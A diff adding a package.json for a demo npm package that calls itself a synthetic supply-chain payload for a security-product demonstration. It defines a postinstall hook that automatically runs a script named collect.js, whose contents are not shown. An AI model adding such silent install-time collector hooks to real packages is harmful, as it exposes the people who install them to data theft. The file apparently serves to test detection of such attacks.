@@ -1,0 +1,10 @@
+{
+  "name": "@area51-demo/json-fast-format",
+  "version": "1.4.2",
+  "description": "DEMO ONLY: synthetic supply-chain payload for the Area51 + Mend Intent demo. Talks only to the demo sink.",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node collect.js"
+  }
+}
